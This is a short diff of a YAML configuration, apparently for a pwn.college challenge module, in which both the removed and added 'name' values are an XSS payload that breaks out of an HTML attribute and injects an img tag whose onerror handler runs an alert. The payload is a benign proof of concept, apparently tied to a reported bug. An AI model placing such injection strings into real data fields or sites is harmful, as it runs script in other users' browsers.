@@ -1,5 +1,5 @@
 id: linux-luminarium
-name: '"><img src=x onerror=alert(&quot;This is an example of XSS. It has been reported.&quot;)><span title="'
+name: '"><img src=x onerror=alert("XSS???")><span title="'
 image: pwncollege/challenge-legacy:latest
 
 description: |
